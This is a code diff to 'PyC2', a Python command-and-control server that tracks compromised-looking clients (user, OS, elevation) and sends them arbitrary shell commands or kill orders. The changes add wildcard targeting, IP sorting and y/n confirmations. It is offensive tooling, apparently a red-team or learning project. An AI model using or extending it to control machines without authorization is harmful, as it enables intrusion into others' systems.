@@ -64,7 +64,7 @@ def main():
     handle_connect_thread = threading.Thread(target=handle_connections, args=(server_sock,), daemon=True)
     handle_connect_thread.start()
 
-    for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
+    for line in [f"\n\t************************************************",f"\t*********************{style.GREEN} PyC2 {style.RESET}*********************","\t************************************************"]:
         print(line)
     print("\nFor entering client IPs or hostnames, you can use * as a wildcard or ? for a single character wildcard.")
 
@@ -103,7 +103,7 @@ def print_pretty(show_dead=True):
             print(f"{status_color}{client['ipaddr']:<15} | {client['hostname']:<20} | {client['sys_os']:<15} | {client['cur_user']:<15} | {client['elevated']:<8} | {client['callback']:<19}{style.RESET}")
 
 '''
-Parses the clients dictionary and returns a list of shallow copies of matching clients
+Parses the clients dictionary and returns a sorted list of shallow copies of matching clients
 Execute this function when you have the clients_list lock
 Args: dict of all clients, pattern to search (full IPADDR or HOSTNAME using ? for single char matching and * for all char matching)
 '''
@@ -116,6 +116,7 @@ def search_clients(clients,pattern,alive_only=False):
                     matched.append(client)
             else:
                 matched.append(client)
+    matched.sort(key=lambda x: ipaddress.ip_address(x["ipaddr"]))
     return matched
 
 # Execute this in a with clients_lock:
@@ -186,26 +187,42 @@ def command_menu():
             if len(clients_info) == 0:
                 print(f"{style.RED}Clients database is empty{style.RESET}")
                 return
-            ping_all(False)
-            print_pretty(True)
+            client_ipaddr = input("Client IP(s)/hostname(s) to ping: ").strip()
+            clients_list = search_clients(clients_info,client_ipaddr,True)
+            if len(clients_list) == 0:
+                print(f"{style.RED}Found 0 clients{style.RESET}")
+            else:
+                print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
+                for client in clients_list:
+                    print(f"{client["ipaddr"]:<15} |",end="")
+                print("")
+                confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
+                if confirm != "y":
+                    return
+                ping_all(clients_list,False)
+                print_pretty(True)
 
     elif response == "3": # Kill by IP
         with clients_lock:
             if len(clients_info) == 0:
                 print(f"{style.RED}Clients database is empty{style.RESET}")
                 return
-        client_ipaddr = input("Client IP(s) to kill: ").strip()
+        client_ipaddr = input("Client IP(s)/hostname(s) to kill: ").strip()
         client_cmd = "KILL"
         with clients_lock:
             clients_list = search_clients(clients_info,client_ipaddr,True)
             if len(clients_list) == 0:
                 print(f"{style.RED}Found 0 clients{style.RESET}")
             else:
-                print(f"{style.BLUE}Killing {len(clients_list)} found alive clients:{style.RESET}")
-                for client_dict in clients_list:
-                    print(f"{client_dict["ipaddr"]:<15} | ",end="")
+                print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
+                for client in clients_list:
+                    print(f"{client["ipaddr"]} |",end="")
+                print("")
+                confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
+                if confirm != "y":
+                    return
                 send_command_clients(clients_list,client_cmd,True)
-                ping_all(False)
+                ping_all(clients_list,False)
                 print_pretty(True)
         '''
         with clients_lock:
@@ -229,17 +246,23 @@ def command_menu():
             if len(clients_info) == 0:
                 print(f"{style.RED}Clients database is empty{style.RESET}")
                 return
-        client_ipaddr = input("Client IP(s) to command: ").strip()
-        client_cmd = input("Command: ").strip()
-        client_cmd = "CMD " + client_cmd
+        client_ipaddr = input("Client IP(s)/hostname(s) to command: ").strip()
+        cmd = input("Command: ").strip()
+        client_cmd = "CMD " + cmd
         with clients_lock:
             clients_list = search_clients(clients_info,client_ipaddr,True)
             if len(clients_list) == 0:
                 print(f"{style.RED}Found 0 clients{style.RESET}")
             else:
-                print(f"{style.BLUE}Executing command on {len(clients_list)} found alive clients:{style.RESET}")
-                for client_dict in clients_list:
-                    print(f"{style.GREEN}{client_dict["ipaddr"]:<15}{style.RESET} | ",end="")
+                print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
+                for client in clients_list:
+                    print(f"{client["ipaddr"]:<15} |",end="")
+                print("")
+                confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
+                if confirm != "y":
+                    return
+                #for client_dict in clients_list:
+                #    print(f"{style.GREEN}{client_dict["ipaddr"]:<15}{style.RESET} | ",end="")
                 send_command_clients(clients_list,client_cmd,True)
 
     elif response == "5": # Exit
@@ -247,8 +270,8 @@ def command_menu():
         if confirm == "y":
             exit()
 
-def ping_all(noisy=False):
-    global clients_info
+# Clients is a list of dicts
+def ping_all(clients,noisy=False):
     threads = []
 
     print(f"Beginning ping of all clients. This may take a few (up to {TIMEOUT_TIME}) seconds...")
@@ -256,8 +279,7 @@ def ping_all(noisy=False):
     #with clients_lock:
         #clients_snapshot = dict(clients_info) # make a copy to safely iterate. TODO this is so wrong
 
-    for client_ip in clients_info:
-        client = clients_info[client_ip]
+    for client in clients:
         thread = threading.Thread(target=ping_client, args=(client, noisy))
         thread.start()
         threads.append(thread)
@@ -284,6 +306,8 @@ def ping_client(client, noisy=False):
             print(f"{style.RED}Client {ip} is dead: {e}{style.RESET}")
         try:
             client["cs"].close()
+        except:
+            pass
         finally:
             client["alive"] = False
             client["cs"] = None
